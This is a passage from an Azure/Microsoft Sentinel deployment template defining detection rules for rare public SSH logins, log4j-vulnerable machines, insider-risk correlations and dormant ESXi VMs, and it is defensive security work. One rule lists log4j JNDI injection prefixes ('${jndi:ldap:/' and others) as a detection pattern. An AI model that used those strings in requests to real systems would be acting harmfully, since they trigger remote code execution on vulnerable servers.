              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/251f18e3-8920-4cd8-aa11-cadd7510722a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/251f18e3-8920-4cd8-aa11-cadd7510722a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "New internet-exposed SSH endpoints",
          "description": "Looks for SSH endpoints that rarely are accessed from a public IP address, in comparison with their history of sign-ins from private IP addresses.",
          "severity": "Medium",
          "enabled": true,
          "query": "let PrivateIPregex = @'^127\\.|^10\\.|^172\\.1[6-9]\\.|^172\\.2[0-9]\\.|^172\\.3[0-1]\\.|^192\\.168\\.'; \nlet avgthreshold = 0;\nlet probabilityLimit = 0.01;\nlet ssh_logins = Syslog\n| where Facility contains \"auth\" and ProcessName =~ \"sshd\"\n| where SyslogMessage has \"Accepted\"\n| extend SourceIP = extract(\"(([0-9]{1,3})\\\\.([0-9]{1,3})\\\\.([0-9]{1,3})\\\\.(([0-9]{1,3})))\",1,SyslogMessage) \n| where isnotempty(SourceIP)\n| extend ipType = iff(SourceIP matches regex PrivateIPregex,\"private\" ,\"public\");\nssh_logins \n| summarize privatecount=countif(ipType==\"private\"), publiccount=countif(ipType==\"public\") by HostName, HostIP, bin(EventTime, 1d)\n| summarize \npublicIPLoginHistory  = make_list(pack('IPCount', publiccount,  'logon_time', EventTime)),\nprivateIPLoginHistory = make_list(pack('IPCount', privatecount, 'logon_time', EventTime)) by HostName, HostIP\n| mv-apply publicIPLoginHistory = publicIPLoginHistory on\n(\n    order by todatetime(publicIPLoginHistory['logon_time']) asc\n    | summarize publicIPLoginCountList=make_list(toint(publicIPLoginHistory['IPCount'])), publicAverage=avg(toint(publicIPLoginHistory['IPCount'])), publicStd=stdev(toint(publicIPLoginHistory['IPCount'])), maxPublicLoginCount=max(toint(publicIPLoginHistory['IPCount']))\n)\n| mv-apply privateIPLoginHistory = privateIPLoginHistory on\n(\n    order by todatetime(privateIPLoginHistory['logon_time']) asc\n    | summarize privateIPLoginCountList=make_list(toint(privateIPLoginHistory['IPCount'])), privateAverage=avg(toint(privateIPLoginHistory['IPCount'])), privateStd=stdev(toint(privateIPLoginHistory['IPCount']))\n)\n// Some logins from private IPs\n| where privateAverage > avgthreshold\n// There is a non-zero number of logins from public IPs\n| where publicAverage > avgthreshold\n// Approximate probability of seeing login from a public IP is < 1%\n| extend probabilityPublic = publicAverage / (privateAverage + publicAverage)\n| where probabilityPublic < probabilityLimit\n// Today has the highest number of logins from public IPs that we've seen in the last week\n| extend publicLoginCountToday = publicIPLoginCountList[-1]\n| where publicLoginCountToday >= maxPublicLoginCount\n| extend HostCustomEntity = HostName\n// Optionally retrieve the original raw data for those logins that we've identified as potentially suspect\n// | join kind=rightsemi (\n//   ssh_logins\n//  | where ipType == \"public\"\n//  ) on HostName",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "4915c713-ab38-432e-800b-8e2d46933de6",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": "1.0.1"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/040bb7eb-6883-48dc-ad07-df9a8eecba18')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/040bb7eb-6883-48dc-ad07-df9a8eecba18')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Vulnerable Machines related to log4j CVE-2021-44228",
          "description": "This query uses the Azure Defender Security Nested Recommendations data to find machines vulnerable to log4j CVE-2021-44228. Log4j is an open-source Apache logging library that is used in \n many Java-based applications. Security Nested Recommendations data is sent to Microsoft Sentinel using the continuous export feature of Azure Defender(refrence link below).\n Reference: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/\n Reference: https://docs.microsoft.com/azure/security-center/continuous-export?tabs=azure-portal\n Reference: https://techcommunity.microsoft.com/t5/microsoft-defender-for-cloud/how-defender-for-cloud-displays-machines-affected-by-log4j/ba-p/3037271",
          "severity": "High",
          "enabled": true,
          "query": "SecurityNestedRecommendation\n| where RemediationDescription has 'CVE-2021-44228'\n| parse ResourceDetails with * 'virtualMachines/' VirtualMAchine '\"' *\n| summarize arg_min(TimeGenerated, *) by TenantId, RecommendationSubscriptionId, VirtualMAchine, RecommendationName,Description,RemediationDescription, tostring(AdditionalData),VulnerabilityId\n| extend Timestamp = TimeGenerated, HostCustomEntity = VirtualMAchine\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "Execution"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5acd1289-0537-409b-b254-e61c1ad61655')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5acd1289-0537-409b-b254-e61c1ad61655')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MLBehaviorAnalytics",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "enabled": true,
          "alertRuleTemplateName": "fa118b98-de46-4e94-87f9-8e6d5060b60b"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/fe50dc63-c9dd-4009-8ccb-84a56b7f9c1b')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/fe50dc63-c9dd-4009-8ccb-84a56b7f9c1b')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MLBehaviorAnalytics",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "enabled": true,
          "alertRuleTemplateName": "737a2ce1-70a3-4968-9e90-3e6aca836abf"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/5eaba9d1-21f8-4684-89d1-fe0451e0ccad')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/5eaba9d1-21f8-4684-89d1-fe0451e0ccad')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "(Preview) Insider Risk - High User Security Alert Correlations",
          "description": "This alert joins SecurityAlerts from Microsoft Products with SecurityIncidents from Azure Sentinel and Microsoft 365 Defender. This join allows for identifying patterns in user principal names associated with respective security alerts. A machine learning function (Basket) is leveraged with a .001 threshold. Baset finds all frequent patterns of discrete attributes (dimensions) in the data. It returns the frequent patterns passed the frequency threshold. This query evaluates UserPrincipalName for patterns in SecurityAlerts and Reporting Security Tools. This query can be further tuned/configured for higher confidence percentages, security products, or alert severities pending the needs of the organization. There is an option for configuration of correlations against Azure Sentinel watchlists. For more information on the basket plugin, see [basket plugin](https://docs.microsoft.com/azure/data-explorer/kusto/query/basketplugin)",
          "severity": "Medium",
          "enabled": true,
          "query": "let AlertLinks = SecurityAlert\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| summarize AlertLinks=make_set(AlertLink) by UPN;\nlet LastTimeObserved = SecurityIncident\n| summarize hint.strategy = shuffle arg_max(LastModifiedTime, *) by IncidentNumber\n| mv-expand AlertIds\n| extend AlertId = tostring(AlertIds)\n| join kind= innerunique ( \n          SecurityAlert \n          )\n          on $left.AlertId == $right.SystemAlertId\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| project UPN, AlertName, Severity, ProductName, TimeGenerated | summarize arg_max(AlertName, Severity, ProductName, TimeGenerated) by UPN;\nSecurityIncident\n| summarize hint.strategy = shuffle arg_max(LastModifiedTime, *) by IncidentNumber\n| mv-expand AlertIds\n| extend AlertId = tostring(AlertIds)\n| join kind= innerunique ( \n          SecurityAlert \n          )\n          on $left.AlertId == $right.SystemAlertId\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| project UPN, AlertName, Severity, ProductName\n| evaluate basket(0.001)\n| where UPN <> \"\"\n// | lookup kind=inner _GetWatchlist('<Your Watchlist Name>') on $left.UPN == $right.SearchKey\n| project UPN, Percent, AlertName, Severity, ProductName\n| join (LastTimeObserved) on UPN\n| sort by Percent desc\n| extend LastObserved = TimeGenerated\n| join kind=inner (AlertLinks) on UPN\n| project UPN, AlertName, Severity, ProductName, Percent, LastObserved, AlertLinks\n| extend AccountCustomEntity = UPN\n",
          "queryFrequency": "P7D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0065af97-8d8f-4985-8290-df9e996e94ef')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0065af97-8d8f-4985-8290-df9e996e94ef')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "User agent search for log4j exploitation attempt",
          "description": "This query uses various log sources having user agent data to look for log4j CVE-2021-44228 exploitation attempt based on user agent pattern. Log4j is an open-source Apache logging library that is used in \n many Java-based applications. The regex and the string matching look for the most common attacks. This might not be comprehensive to detect every possible user agent variation.\n Reference: https://msrc-blog.microsoft.com/2021/12/11/microsofts-response-to-cve-2021-44228-apache-log4j2/",
          "severity": "High",
          "enabled": true,
          "query": "let UserAgentString = dynamic ([\"${jndi:ldap:/\", \"${jndi:rmi:/\", \"${jndi:ldaps:/\", \"${jndi:dns:/\", \"${jndi:iiop:/\",\"${jndi:\",\"${jndi:nds:/\",\"${jndi:corba/\"]);\nlet UARegex = @'(\\\\$|%24)(\\\\{|%7B)([^jJ]*[jJ])([^nN]*[nN])([^dD]*[dD])([^iI]*[iI])(:|%3A|\\\\$|%24|}|%7D)';\n(union isfuzzy=true\n(OfficeActivity\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = ClientIP, Account = UserId, Type, Operation\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP\n),\n(AzureDiagnostics\n| where Category in (\"FrontdoorWebApplicationFirewallLog\", \"FrontdoorAccessLog\", \"ApplicationGatewayFirewallLog\", \"ApplicationGatewayAccessLog\")\n| where userAgent_s has_any (UserAgentString) or userAgent_s matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent = userAgent_s, SourceIP = clientIP_s, Type, host_s, requestUri_s, httpStatus_d\n| extend timestamp = StartTime, IPCustomEntity = SourceIP, UrlCustomEntity = requestUri_s\n),\n(\nW3CIISLog\n| where csUserAgent has_any (UserAgentString) or csUserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent = csUserAgent, SourceIP = cIP, Account = csUserName, Type, sSiteName, csMethod, csUriStem\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP, UrlCustomEntity = csUriStem\n),\n(\nAWSCloudTrail\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = SourceIpAddress, Account = UserIdentityUserName, Type, EventName\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP\n),\n(SigninLogs\n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = IPAddress, Account = UserPrincipalName, Type, Operation = OperationName, tostring(LocationDetails), tostring(DeviceDetail),    AppDisplayName, ClientAppUsed\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP\n),\n(AADNonInteractiveUserSignInLogs \n| where UserAgent has_any (UserAgentString) or UserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by UserAgent, SourceIP = IPAddress, Account = UserPrincipalName, Type, Operation = OperationName, tostring(LocationDetails), tostring(DeviceDetail), AppDisplayName, ClientAppUsed\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP\n),\n(imWebSessions\n| where HttpUserAgent has_any (UserAgentString) or HttpUserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by HttpUserAgent, SourceIP = SrcIpAddr, DstIpAddr, Account = SrcUsername, URL, Type\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP, UrlCustomEntity = URL\n),\n(imNetworkSession\n| where HttpUserAgent has_any (UserAgentString) or HttpUserAgent matches regex UARegex\n| summarize StartTime = min(TimeGenerated), EndTime = max(TimeGenerated) by HttpUserAgent, SourceIP = SrcIpAddr, DstIpAddr, Account = SrcUsername, Type, Url\n| extend timestamp = StartTime, AccountCustomEntity = Account, IPCustomEntity = SourceIP, UrlCustomEntity = Url\n)\n)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "UrlCustomEntity"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/2eab718c-4874-4e52-9492-8052d0e8feb2')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/2eab718c-4874-4e52-9492-8052d0e8feb2')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "(Preview) Insider Risk - High User Security Incidents Correlation",
          "description": "This alert joins SecurityAlerts to SecurityIncidents to associate Security Alerts and Incidents with user accounts. This aligns all Microsoft Alerting Products (MCAS, MDE, ASC, etc.) with Microsoft Incident Generating Products (Azure Sentinel, M365 Defender) for a count of user security incidents over time. The default threshold is 5 security incidents, and this is customizable per the organization's requirements. Results include UserPrincipalName (UPN), SecurityIncident, LastIncident, ProductName, LastObservedTime, and Previous Incidents. There is an option for configuration of correlations against Azure Sentinel watchlists. For more information, see [Investigate incidents with Azure Sentinel]( https://docs.microsoft.com/azure/sentinel/investigate-cases).",
          "severity": "High",
          "enabled": true,
          "query": "let PreviousIncidents =\nSecurityIncident\n| summarize hint.strategy = shuffle arg_max(LastModifiedTime, *) by IncidentNumber\n| mv-expand AlertIds\n| extend AlertId = tostring(AlertIds)\n| join kind= innerunique ( \n          SecurityAlert \n          )\n          on $left.AlertId == $right.SystemAlertId\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| summarize PreviousIncidents = make_set(IncidentNumber) by UPN;\nlet LastTimeObserved =\nSecurityIncident\n| summarize hint.strategy = shuffle arg_max(LastModifiedTime, *) by IncidentNumber\n| mv-expand AlertIds\n| extend AlertId = tostring(AlertIds)\n| join kind= innerunique ( \n          SecurityAlert \n          )\n          on $left.AlertId == $right.SystemAlertId\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| summarize arg_max(TimeGenerated, IncidentName) by UPN;\n  SecurityIncident\n| summarize hint.strategy = shuffle arg_max(LastModifiedTime, *) by IncidentNumber\n| mv-expand AlertIds\n| extend AlertId = tostring(AlertIds)\n| join kind= innerunique ( \n          SecurityAlert \n          )\n          on $left.AlertId == $right.SystemAlertId\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| summarize count() by UPN, IncidentName, IncidentNumber, IncidentUrl, Severity, ProductName\n| extend SecurityIncidents = count_\n| where SecurityIncidents > 5 //Adjust & Tune within Organzational Requirements\n| join (LastTimeObserved) on UPN\n| project-rename LastObserved = TimeGenerated, LastIncident = IncidentNumber\n| project-away IncidentName, count_, UPN1, IncidentName1, Severity, IncidentUrl\n| join kind=inner (PreviousIncidents) on UPN\n// | lookup kind=inner _GetWatchlist('<Your Watchlist Name>') on $left.UPN == $right.SearchKey\n| project UPN, SecurityIncidents, LastIncident, ProductName, LastObserved, PreviousIncidents\n| sort by SecurityIncidents desc\n| limit 25\n| extend AccountCustomEntity = UPN\n",
          "queryFrequency": "P7D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "AadUserId",
                  "columnName": "AccountCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/388dea19-5a33-4099-a431-7dfabb995b29')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/388dea19-5a33-4099-a431-7dfabb995b29')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "VMware ESXi - Dormant VM started",
          "description": "Detects when dormant VM was started.",
          "severity": "Medium",
          "enabled": false,
          "query": "let vm_p_off =\nVMwareESXi\n| where TimeGenerated > ago(14d)\n| where SyslogMessage has ('VmPoweredOffEvent')\n| extend DstHostname = extract(@'\\[\\d+\\]\\s+\\[(.*?)\\s+on', 1, SyslogMessage)\n| summarize LastPowerOffTime=max(TimeGenerated) by DstHostname\n| where datetime_diff('day',datetime(now),LastPowerOffTime) >= 20; \nlet vm_p_on =\nVMwareESXi\n| where TimeGenerated > ago(14d)\n| where SyslogMessage has ('VmPoweredOnEvent')\n| extend DstHostname = extract(@'\\[\\d+\\]\\s+\\[(.*?)\\s+on', 1, SyslogMessage)\n| summarize LastPowerOnTime=max(TimeGenerated) by DstHostname\n| where datetime_diff('day',datetime(now),LastPowerOnTime) >= 20;\nlet off_vms =\nvm_p_on\n| join (vm_p_off) on DstHostname\n| where LastPowerOffTime > LastPowerOnTime\n| summarize p_off_vm = makeset(DstHostname)\n| extend k=1;\nlet p_on_vms =\nVMwareESXi\n| where TimeGenerated between (ago(24h) .. datetime(now))\n| where SyslogMessage has ('VmPoweredOnEvent')\n| extend DstHostname = extract(@'\\[\\d+\\]\\s+\\[(.*?)\\s+on', 1, SyslogMessage)\n| extend k=1\n| join (off_vms) on k\n| where p_off_vm !has DstHostname\n| summarize rec_p_on = makeset(DstHostname)\n| extend HostCustomEntity = rec_p_on\n",
          "queryFrequency": "PT1H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT1H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": null,
              "groupByCustomDetails": null
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/f95197e7-30ab-4242-8211-7bd93d0936c1')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/f95197e7-30ab-4242-8211-7bd93d0936c1')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Known ZINC related maldoc hash",
          "description": "Document hash used by ZINC in highly targeted spear phishing campaign.",
          "severity": "High",
          "enabled": true,
